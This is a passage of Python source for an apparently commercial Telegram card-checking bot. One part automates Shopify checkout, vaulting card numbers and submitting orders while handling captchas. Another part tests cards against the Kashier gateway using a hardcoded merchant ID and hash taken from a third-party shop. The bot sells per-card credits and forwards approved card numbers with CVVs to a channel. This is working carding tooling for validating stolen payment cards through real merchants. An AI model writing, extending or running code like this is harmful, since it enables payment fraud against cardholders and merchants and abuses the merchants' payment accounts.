            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
            
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)
            
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            for i in range(2):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url_final, max_retries=1
                )
                if i == 0:
                    await asyncio.sleep(3)
            
            if not response:
                return False, f"GraphQL Request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            
            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency
                
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData')
                
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                running_total = running_total_data['value']['amount']
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            payment_identifier = None
            gateway = "UNKNOWN"
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break
            
            if not is_shopify_gateway(gateway):
                remove_bad_site(ourl)
                return False, "CARD_DECLINED", gateway, total_price, currency
            
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency
            
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy if delivery_strategy else '',
                    'customDeliveryRate': False
                },
                'options': {}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId or '1'}]
            }
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url_final, max_retries=1
            )
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(ourl).netloc
            }
            
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
            
            try:
                response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
                token_data = await response.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy if delivery_strategy else '',
                                    'customDeliveryRate': False
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {
                                'lines': [{'stableId': stableId or '1'}]
                            },
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {
                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                            },
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': running_total, 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url_final}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url_final, max_retries=1
            )
            
            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            
            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                detail = localized_msg or non_localized_msg
                                if detail:
                                    return False, detail, gateway, total_price, currency
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(3)
            
            for i in range(4):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url_final, max_retries=1
                )
                
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                        
                except Exception as e:
                    pass
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except:
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        error_msg = f"Error Processing Card: {str(e)}"
        return False, error_msg, "UNKNOWN", "0.00", "USD"

async def shopify_check_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await shopify_check_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)

async def kashier_check_card_async(cc, mes, ano, cvv):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Kashier-Hash': '43fe05c39631d496e0eedfc06e9b252f28a2c5d8a85200e3e2b14d75bdf2b2df',
            'Origin': 'https://checkout.kashier.io',
            'Referer': 'https://checkout.kashier.io/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        json_init = {
            'apiOperation': 'INITIATE_AUTHENTICATION',
            'paymentMethod': {
                'type': 'CARD',
                'card': {
                    'number': cc,
                    'save': False,
                    'enable3DS': True,
                },
            },
            'order': {
                'reference': f'WH-{datetime.now().strftime("%Y%m%d")}-{random.randint(1000, 9999)}',
                'amount': '99.47',
                'currency': 'EGP',
            },
            'device': {
                'browserDetails': {
                    'javaEnabled': False,
                    'language': 'ar-EG',
                    'screenHeight': 743,
                    'screenWidth': 384,
                    'timeZone': -180,
                    'colorDepth': 24,
                    'acceptHeaders': 'application/json',
                    '3DSecureChallengeWindowSize': '390_X_400',
                },
                'browser': 'Chrome',
            },
            'reconciliation': {
                'webhookUrl': 'https://www.hostwega.com/clients//modules/gateways/callback/kashier.php',
                'merchantRedirect': 'https://www.hostwega.com/clients//viewinvoice.php?id=11452',
            },
            'interactionSource': 'ECOMMERCE',
            'metaData': {
                'kashier payment UI version': 'V2',
            },
            'merchantId': 'MID-16120-877',
            'timestamp': -3,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://fep.kashier.io/v3/orders', headers=headers, json=json_init, timeout=30) as response:
                if response.status != 200:
                    return f"FAILURE|HTTP {response.status}"
                
                data = await response.json()
                order_id = data.get('response', {}).get('orderId')
                
                if not order_id:
                    return "FAILURE|No Order ID"
                
                json_pay = {
                    'apiOperation': 'PAY',
                    'paymentMethod': {
                        'type': 'CARD',
                        'card': {
                            'number': cc,
                            'expiry': {
                                'month': mes,
                                'year': ano,
                            },
                            'nameOnCard': 'Mohamed Hamdy',
                            'securityCode': cvv,
                        },
                    },
                    'interactionSource': 'ECOMMERCE',
                    'metaData': {
                        'kashier payment UI version': 'V2',
                    },
                    'merchantId': 'MID-16120-877',
                }

                async with session.put(
                    f'https://fep.kashier.io/v3/orders/{order_id}',
                    headers=headers,
                    json=json_pay,
                    timeout=30
                ) as response_pay:
                    
                    data = await response_pay.json()
                    status = data.get('status', 'UNKNOWN')
                    
                    msg_ar = data.get('messages', {}).get('ar', '')
                    msg_en = data.get('messages', {}).get('en', '')
                    
                    msg = msg_ar if msg_ar else msg_en
                    
                    if not msg:
                        msg = data.get('response', {}).get('transactionResponseMessage', {}).get('ar', '')
                        if not msg:
                            msg = data.get('response', {}).get('transactionResponseMessage', {}).get('en', 'لا توجد رسالة')
                    
                    return f"{status}|{msg}"
                    
    except asyncio.TimeoutError:
        return "ERROR|Timeout"
    except Exception as e:
        return f"ERROR|{str(e)}"

async def kashier_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if not check_user_subscription(user_id):
        await update.message.reply_text(get_subscription_required_text(), reply_markup=subscription_required_keyboard(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    if not is_premium(user_id):
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('Premium Only!')}

{get_emoji_text('info')} {to_bold('This command is for premium users only.')}
{get_emoji_text('buy')} {to_bold('Subscribe now to get access.')}

{get_emoji_text('dm')} {to_bold('Contact:')} @hhhiqh""", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"""{get_emoji_text('gateway')} {to_bold('Kashier Check Usage:')}

<code>/kh CC|MM|YYYY|CVV</code>

{get_emoji_text('plus')} {to_bold('Example:')}
<code>/kh 4111111111111111|12|2028|123</code>

{get_emoji_text('info')} {to_bold('1 credit per check')}""", parse_mode="HTML")
        return
    
    card_input = args[1]
    try:
        cc, mes, ano, cvv = card_input.split('|')
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid format!')}\n\n{get_emoji_text('plus')} {to_bold('Use:')} <code>CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return
    
    if not deduct_credit(user_id):
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('No Credits!')}

{get_emoji_text('credit')} {to_bold('Your balance is insufficient.')}
{get_emoji_text('buy')} {to_bold('Subscribe to get credits.')}""", parse_mode="HTML")
        return
    
    msg = await update.message.reply_text(f"""{get_emoji_text('check')} {to_bold('Checking Kashier...')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{cc[:6]}...{cc[-4:]}</code>

{get_emoji_text('loading')} {to_bold('Processing...')}""", parse_mode="HTML")
    
    try:
        start_time = time.time()
        result = await kashier_check_card_async(cc, mes, ano, cvv)
        time_taken = f"{time.time() - start_time:.2f}s"
        
        stats = get_user_stats(user_id)
        user_plan = stats['plan']
        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        
        type_display = f"{card_type}"
        if level:
            type_display += f" - {level}"
        
        card_formatted = format_card_text(cc, mes, ano, cvv)
        
        if '|' in result:
            status, message = result.split('|', 1)
        else:
            status = 'UNKNOWN'
            message = result
        
        clean_response = extract_clean_response(message)
        
        if status == 'SUCCESS':
            result_text = f"""{get_emoji_text('approved')} {to_bold('APPROVED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} Kashier
{get_emoji_text('info')} {to_bold('Response ⇾')} {message}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
            
            await send_approved_to_channel_shopify_async(cc, mes, ano, cvv, "0.00", message, time_taken, username, user_plan, "Kashier")
            
        elif status == 'FAILURE':
            result_text = f"""{get_emoji_text('declined')} {to_bold('DECLINED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} Kashier
{get_emoji_text('info')} {to_bold('Response ⇾')} {message}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
            
        elif status == 'ERROR':
            result_text = f"""{get_emoji_text('error')} {to_bold('ERROR')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} Kashier
{get_emoji_text('info')} {to_bold('Response ⇾')} {message}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
            
        else:
            result_text = f"""{get_emoji_text('warning')} {to_bold('UNKNOWN')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} Kashier
{get_emoji_text('info')} {to_bold('Response ⇾')} {message}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
        
        await msg.edit_text(result_text, parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Error in kashier_check_command: {e}")
        error_text = f"{get_emoji_text('error')} {to_bold('Error!')}\n\n{str(e)}"
        await msg.edit_text(error_text, parse_mode="HTML")

def is_valid_response(clean_response):
